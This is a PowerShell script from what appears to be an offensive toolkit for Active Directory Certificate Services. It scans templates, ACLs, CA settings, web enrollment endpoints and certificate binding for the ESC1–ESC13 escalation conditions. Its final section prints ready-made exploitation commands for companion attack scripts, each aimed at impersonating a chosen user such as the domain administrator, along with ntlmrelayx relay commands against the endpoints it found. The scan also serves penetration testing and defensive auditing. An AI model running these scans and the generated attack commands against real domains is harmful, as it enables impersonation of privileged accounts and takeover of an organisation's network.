<#
.SYNOPSIS
    AD CS Enumeration - Scan for all ESC1-ESC13 conditions.
.DESCRIPTION
    Discovers vulnerable certificate templates, CA misconfigurations,
    HTTP endpoints, ACL weaknesses, and certificate binding enforcement.
    Uses only native Windows tools.
.EXAMPLE
    .\Invoke-Enumerate.ps1
.EXAMPLE
    .\Invoke-Enumerate.ps1 -Verbose
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param()

$ErrorActionPreference = 'Stop'

# Load shared helpers
$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

Write-Host ""
Write-Host "  AD CS LOLBAS - Enumerate (Standalone)" -ForegroundColor White
Write-Host "  ---------------------------------------" -ForegroundColor DarkGray
Write-Host ""

# -- Begin Enumeration ---------------------------------------------
Write-Banner "ENUMERATE" "Scanning all ESC conditions"

$ctx = Get-ADContext

# -- ESC1/ESC2/ESC3/ESC9/ESC13: Template Analysis -----------------
Write-Stage -Number 1 -Name "TEMPLATE ENUMERATION"
Write-Host ""
Write-Host "    PS> Get-ADObject -SearchBase `"$($ctx.TemplateBase)`"  ``" -ForegroundColor DarkYellow
Write-Host "            -Filter {objectClass -eq 'pKICertificateTemplate'} -Properties *" -ForegroundColor DarkYellow
Write-Host "    Checks: msPKI-Certificate-Name-Flag (SAN), msPKI-Enrollment-Flag (approval)," -ForegroundColor DarkGray
Write-Host "            msPKI-RA-Signature, pKIExtendedKeyUsage (EKU), msPKI-Certificate-Policy (OID)" -ForegroundColor DarkGray
Write-Host ""

$authEKUs = @(
    "1.3.6.1.5.5.7.3.2",
    "1.3.6.1.4.1.311.20.2.2",
    "1.3.6.1.5.2.3.4",
    "2.5.29.37.0"
)
$agentEKU = "1.3.6.1.4.1.311.20.2.1"

$templates = Get-ADObject -SearchBase $ctx.TemplateBase `
    -Filter {objectClass -eq 'pKICertificateTemplate'} `
    -Properties * |
    Select-Object Name, DistinguishedName,
        @{N='NameFlag';E={$_.'msPKI-Certificate-Name-Flag'}},
        @{N='EnrollFlag';E={$_.'msPKI-Enrollment-Flag'}},
        @{N='RASignature';E={$_.'msPKI-RA-Signature'}},
        @{N='EKUs';E={$_.'pKIExtendedKeyUsage'}},
        @{N='CertPolicy';E={$_.'msPKI-Certificate-Policy'}},
        @{N='SD';E={$_.nTSecurityDescriptor}}

$findings = @()
$exploits  = @()   # Structured: @{ ESC; Template; Detail }
$caConfigs = @()   # Discovered CA config strings

foreach ($t in $templates) {
    $hasAuthEKU   = ($null -eq $t.EKUs) -or ($t.EKUs | Where-Object { $_ -in $authEKUs })
    $hasAnyOrNone = ($null -eq $t.EKUs) -or ($t.EKUs -contains "2.5.29.37.0")
    $hasAgentEKU  = $t.EKUs -contains $agentEKU
    $suppliesSAN  = ($t.NameFlag -band 1) -eq 1
    $noApproval   = ($t.EnrollFlag -band 2) -ne 2
    $noSignature  = ($t.RASignature -eq 0) -or ($null -eq $t.RASignature)
    $noSecExt     = ($t.EnrollFlag -band 0x80000) -ne 0

    if ($suppliesSAN -and $hasAuthEKU -and $noApproval -and $noSignature) {
        $findings += "    [!] ESC1  - $($t.Name): ENROLLEE_SUPPLIES_SUBJECT + Auth EKU"
        $exploits += @{ ESC='ESC1'; Template=$t.Name }
        Write-Host $findings[-1] -ForegroundColor Red
    }
    if ($hasAnyOrNone -and $noApproval -and $noSignature) {
        $findings += "    [!] ESC2  - $($t.Name): Any Purpose / No EKU"
        $exploits += @{ ESC='ESC2'; Template=$t.Name }
        Write-Host $findings[-1] -ForegroundColor Yellow
    }
    if ($hasAgentEKU -and $noApproval -and $noSignature) {
        $findings += "    [!] ESC3  - $($t.Name): Certificate Request Agent EKU"
        $exploits += @{ ESC='ESC3'; Template=$t.Name }
        Write-Host $findings[-1] -ForegroundColor Yellow
    }
    if ($noSecExt -and $hasAuthEKU) {
        $findings += "    [!] ESC9  - $($t.Name): CT_FLAG_NO_SECURITY_EXTENSION"
        $exploits += @{ ESC='ESC9'; Template=$t.Name }
        Write-Host $findings[-1] -ForegroundColor Yellow
    }

    if ($t.CertPolicy) {
        foreach ($oid in $t.CertPolicy) {
            $oidObj = Get-ADObject -SearchBase $ctx.OIDBase `
                -Filter {msPKI-Cert-Template-OID -eq $oid} `
                -Properties 'msDS-OIDToGroupLink' -ErrorAction SilentlyContinue
            if ($oidObj.'msDS-OIDToGroupLink') {
                $findings += "    [!] ESC13 - $($t.Name): OID $oid -> group $($oidObj.'msDS-OIDToGroupLink')"
                $exploits += @{ ESC='ESC13'; Template=$t.Name }
                Write-Host $findings[-1] -ForegroundColor Magenta
            }
        }
    }
}

# -- ESC4/ESC5: ACL Checks ----------------------------------------
Write-Host ""
Write-Stage -Number 2 -Name "ACL ENUMERATION (ESC4/ESC5)"
Write-Host ""
Write-Host "    PS> `$template.nTSecurityDescriptor.Access | Where-Object {" -ForegroundColor DarkYellow
Write-Host "            `$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|WriteProperty'" -ForegroundColor DarkYellow
Write-Host "        }" -ForegroundColor DarkYellow
Write-Host "    PS> Get-ADObject -Identity `"<PKI Container DN>`" -Properties nTSecurityDescriptor" -ForegroundColor DarkYellow
Write-Host "    Checks: Template ACLs (ESC4), PKI container ACLs (ESC5)" -ForegroundColor DarkGray
Write-Host ""

$dangerousRights = 'GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty'
$lowPrivGroups   = @('Authenticated Users','Domain Users','Domain Computers','Everyone')

foreach ($t in $templates) {
    if ($t.SD) {
        foreach ($ace in $t.SD.Access) {
            if ($ace.ActiveDirectoryRights -match $dangerousRights) {
                $id = $ace.IdentityReference.Value
                if ($lowPrivGroups | Where-Object { $id -match $_ }) {
                    $msg = "    [!] ESC4  - $($t.Name): $id has $($ace.ActiveDirectoryRights)"
                    $findings += $msg
                    $exploits += @{ ESC='ESC4'; Template=$t.Name }
                    Write-Host $msg -ForegroundColor Red
                }
            }
        }
    }
}

$pkiTargets = @($ctx.PKIBase, $ctx.TemplateBase, $ctx.EnrollBase, $ctx.OIDBase, $ctx.NTAuthDN)
foreach ($dn in $pkiTargets) {
    try {
        $obj = Get-ADObject -Identity $dn -Properties nTSecurityDescriptor -ErrorAction Stop
        foreach ($ace in $obj.nTSecurityDescriptor.Access) {
            if ($ace.ActiveDirectoryRights -match $dangerousRights) {
                $id = $ace.IdentityReference.Value
                if ($lowPrivGroups | Where-Object { $id -match $_ }) {
                    $shortDN = ($dn -split ',')[0]
                    $msg = "    [!] ESC5  - $shortDN : $id has $($ace.ActiveDirectoryRights)"
                    $findings += $msg
                    Write-Host $msg -ForegroundColor Red
                }
            }
        }
    } catch { }
}

# -- ESC6/ESC7/ESC11: CA Configuration ----------------------------
Write-Host ""
Write-Stage -Number 3 -Name "CA CONFIGURATION (ESC6/ESC7/ESC11)"
Write-Host ""
Write-Host "    PS> certutil -config `"<CA>`" -getreg policy\EditFlags" -ForegroundColor DarkYellow
Write-Host "    PS> certutil -config `"<CA>`" -getreg CA\Security" -ForegroundColor DarkYellow
Write-Host "    PS> certutil -config `"<CA>`" -getreg CA\InterfaceFlags" -ForegroundColor DarkYellow
Write-Host "    Checks: EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6), ManageCA/ManageCerts ACLs (ESC7)," -ForegroundColor DarkGray
Write-Host "            IF_ENFORCEENCRYPTICERTREQUEST (ESC11)" -ForegroundColor DarkGray
Write-Host ""

foreach ($ca in (Get-CAConfigs)) {
    $caConfigs += $ca
    Write-Host "    [*] CA: $ca" -ForegroundColor Cyan

    $editFlags = certutil -config $ca -getreg policy\EditFlags 2>$null
    if ($editFlags -match 'EDITF_ATTRIBUTESUBJECTALTNAME2') {
        $msg = "    [!] ESC6  - EDITF_ATTRIBUTESUBJECTALTNAME2 ENABLED"
        $findings += $msg; $exploits += @{ ESC='ESC6'; Template=''; CA=$ca }
        Write-Host $msg -ForegroundColor Red
    } else {
        Write-Host "    [+] ESC6  - EDITF_ATTRIBUTESUBJECTALTNAME2 not set" -ForegroundColor Green
    }

    $caACL = certutil -config $ca -getreg CA\Security 2>$null
    $esc7Found = $false
    $caACL | Select-String 'ManageCA|ManageCertificates' | ForEach-Object {
        $msg = "    [!] ESC7  - $($_.Line.Trim())"
        $findings += $msg; Write-Host $msg -ForegroundColor Yellow
        if (-not $esc7Found) { $exploits += @{ ESC='ESC7'; Template=''; CA=$ca }; $esc7Found = $true }
    }

    $intFlags = certutil -config $ca -getreg CA\InterfaceFlags 2>$null
    if ($intFlags -notmatch 'IF_ENFORCEENCRYPTICERTREQUEST') {
        $msg = "    [!] ESC11 - IF_ENFORCEENCRYPTICERTREQUEST NOT set (RPC relay possible)"
        $findings += $msg; $exploits += @{ ESC='ESC11'; Template=''; CA=$ca }
        Write-Host $msg -ForegroundColor Yellow
    } else {
        Write-Host "    [+] ESC11 - IF_ENFORCEENCRYPTICERTREQUEST set" -ForegroundColor Green
    }
}

# -- ESC8: HTTP Endpoints -----------------------------------------
Write-Host ""
Write-Stage -Number 4 -Name "HTTP ENDPOINT DISCOVERY (ESC8)"
Write-Host ""
Write-Host "    PS> Get-ADObject -SearchBase `"$($ctx.EnrollBase)`"  ``" -ForegroundColor DarkYellow
Write-Host "            -Filter {objectClass -eq 'pKIEnrollmentService'} -Properties dNSHostName" -ForegroundColor DarkYellow
Write-Host "    PS> Invoke-WebRequest -Uri `"http://<CA>/certsrv/`" -UseBasicParsing -TimeoutSec 5" -ForegroundColor DarkYellow
Write-Host "    Checks: HTTP/HTTPS web enrollment endpoints (NTLM relay target)" -ForegroundColor DarkGray
Write-Host ""

$enrollServices = Get-ADObject -SearchBase $ctx.EnrollBase `
    -Filter {objectClass -eq 'pKIEnrollmentService'} `
    -Properties dNSHostName, cn -ErrorAction SilentlyContinue

foreach ($svc in $enrollServices) {
    $h = $svc.dNSHostName
    foreach ($url in @("http://$h/certsrv/","https://$h/certsrv/")) {
        try {
            $resp = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
            $msg = "    [!] ESC8  - Web Enrollment: $url (HTTP $($resp.StatusCode))"
            $findings += $msg; $exploits += @{ ESC='ESC8'; Template=''; URL=$url }
            Write-Host $msg -ForegroundColor Red
        } catch {
            if ($_.Exception.Response) {
                $code = [int]$_.Exception.Response.StatusCode
                if ($code -eq 401) {
                    $msg = "    [!] ESC8  - Web Enrollment: $url (401 - exists, auth required)"
                    $findings += $msg; $exploits += @{ ESC='ESC8'; Template=''; URL=$url }; Write-Host $msg -ForegroundColor Yellow
                }
            }
        }
    }
}

# -- ESC9/ESC10: Registry -----------------------------------------
Write-Host ""
Write-Stage -Number 5 -Name "CERTIFICATE BINDING ENFORCEMENT (ESC9/ESC10)"
Write-Host ""
Write-Host "    PS> Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc'  ``" -ForegroundColor DarkYellow
Write-Host "            -Name 'StrongCertificateBindingEnforcement'" -ForegroundColor DarkYellow
Write-Host "    Values: 0=Disabled (ESC9/10), 1=Compatibility (ESC9/10), 2=Full Enforcement" -ForegroundColor DarkGray
Write-Host ""

try {
    $regVal = (Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc' `
        -Name 'StrongCertificateBindingEnforcement' -ErrorAction Stop).StrongCertificateBindingEnforcement
    switch ($regVal) {
        0 { $msg = "    [!] StrongCertificateBindingEnforcement = 0 (DISABLED)"; Write-Host $msg -ForegroundColor Red; $findings += $msg }
        1 { $msg = "    [!] StrongCertificateBindingEnforcement = 1 (COMPATIBILITY)"; Write-Host $msg -ForegroundColor Yellow; $findings += $msg }
        2 { Write-Host "    [+] StrongCertificateBindingEnforcement = 2 (FULL)" -ForegroundColor Green }
    }
} catch {
    $msg = "    [!] StrongCertificateBindingEnforcement not set (defaults to 1 - Compatibility)"
    Write-Host $msg -ForegroundColor Yellow; $findings += $msg
}

# -- Summary -------------------------------------------------------
Write-Host ""
Write-Host "  ============================================" -ForegroundColor DarkCyan
Write-Host "  ENUMERATION COMPLETE - $($findings.Count) findings" -ForegroundColor $(if ($findings.Count -gt 0) {'Red'} else {'Green'})
Write-Host "  ============================================" -ForegroundColor DarkCyan
Write-Host ""

# -- Exploitation Commands -----------------------------------------
if ($exploits.Count -gt 0) {
    $ca = if ($caConfigs.Count -gt 0) { $caConfigs[0] } else { '<CA\Name>' }

    Write-Host "  EXPLOITATION COMMANDS" -ForegroundColor White
    Write-Host "  =====================" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  Replace <TARGET_UPN> with the user to impersonate (e.g., administrator@$($ctx.Domain))" -ForegroundColor DarkGray
    Write-Host ""

    # Deduplicate by ESC+Template
    $seen = @{}
    foreach ($e in $exploits) {
        $key = "$($e.ESC)|$($e.Template)"
        if ($seen.ContainsKey($key)) { continue }
        $seen[$key] = $true

        switch ($e.ESC) {
            'ESC1' {
                Write-Host "  # ESC1 - $($e.Template) (Enrollee Supplies Subject)" -ForegroundColor Red
                Write-Host "  .\Invoke-ESC1.ps1 -CAConfig `"$ca`" -TemplateName `"$($e.Template)`" -TargetUPN `"<TARGET_UPN>`"" -ForegroundColor White
                Write-Host ""
            }
            'ESC2' {
                Write-Host "  # ESC2 - $($e.Template) (Any Purpose / No EKU)" -ForegroundColor Yellow
                Write-Host "  .\Invoke-ESC2.ps1 -CAConfig `"$ca`" -TemplateName `"$($e.Template)`"" -ForegroundColor White
                Write-Host ""
            }
            'ESC3' {
                Write-Host "  # ESC3 - $($e.Template) (Enrollment Agent)" -ForegroundColor Yellow
                Write-Host "  .\Invoke-ESC3.ps1 -CAConfig `"$ca`" -AgentTemplate `"$($e.Template)`" -TargetTemplate `"User`" -TargetUPN `"<TARGET_UPN>`"" -ForegroundColor White
                Write-Host ""
            }
            'ESC4' {
                Write-Host "  # ESC4 - $($e.Template) (Template ACL Abuse -> ESC1)" -ForegroundColor Red
                Write-Host "  .\Invoke-ESC4.ps1 -CAConfig `"$ca`" -TemplateName `"$($e.Template)`" -TargetUPN `"<TARGET_UPN>`"" -ForegroundColor White
                Write-Host ""
            }
            'ESC6' {
                $useCA = if ($e.CA) { $e.CA } else { $ca }
                Write-Host "  # ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 on $useCA" -ForegroundColor Red
                Write-Host "  .\Invoke-ESC6.ps1 -CAConfig `"$useCA`" -TemplateName `"User`" -TargetUPN `"<TARGET_UPN>`"" -ForegroundColor White
                Write-Host ""
            }
            'ESC7' {
                $useCA = if ($e.CA) { $e.CA } else { $ca }
                Write-Host "  # ESC7a - ManageCA -> Enable ESC6 flag on $useCA" -ForegroundColor Yellow
                Write-Host "  .\Invoke-ESC7a.ps1 -CAConfig `"$useCA`" -TemplateName `"User`" -TargetUPN `"<TARGET_UPN>`"" -ForegroundColor White
                Write-Host ""
                Write-Host "  # ESC7b - ManageCertificates -> Self-Approve on $useCA" -ForegroundColor Yellow
                Write-Host "  .\Invoke-ESC7b.ps1 -CAConfig `"$useCA`" -TemplateName `"User`" -TargetUPN `"<TARGET_UPN>`"" -ForegroundColor White
                Write-Host ""
            }
            'ESC8' {
                $relayURL = if ($e.URL) { $e.URL } else { 'http://<CA>/certsrv/' }
                Write-Host "  # ESC8 - NTLM Relay to Web Enrollment: $relayURL" -ForegroundColor Red
                Write-Host "  .\Invoke-ESC8.ps1   # Discovery only - relay requires ntlmrelayx" -ForegroundColor White
                Write-Host "  # ntlmrelayx.py -t $relayURL --adcs --template User" -ForegroundColor DarkGray
                Write-Host ""
            }
            'ESC9' {
                Write-Host "  # ESC9 - $($e.Template) (No Security Extension + UPN Manipulation)" -ForegroundColor Yellow
                Write-Host "  .\Invoke-ESC9.ps1 -CAConfig `"$ca`" -TemplateName `"$($e.Template)`" -AccountToModify `"<CONTROLLED_USER>`" -TargetUPN `"<TARGET_UPN>`"" -ForegroundColor White
                Write-Host ""
            }
            'ESC11' {
                $useCA = if ($e.CA) { $e.CA } else { $ca }
                Write-Host "  # ESC11 - RPC Relay (IF_ENFORCEENCRYPTICERTREQUEST not set) on $useCA" -ForegroundColor Yellow
                Write-Host "  .\Invoke-ESC11.ps1  # Discovery only - relay requires ntlmrelayx" -ForegroundColor White
                Write-Host "  # ntlmrelayx.py -t rpc://$($useCA.Split('\')[0]) --adcs" -ForegroundColor DarkGray
                Write-Host ""
            }
            'ESC13' {
                Write-Host "  # ESC13 - $($e.Template) (OID Group Link)" -ForegroundColor Magenta
                Write-Host "  .\Invoke-ESC13.ps1 -CAConfig `"$ca`" -TemplateName `"$($e.Template)`"" -ForegroundColor White
                Write-Host ""
            }
        }
    }
} else {
    Write-Host "  [+] No exploitable conditions found" -ForegroundColor Green
    Write-Host ""
}
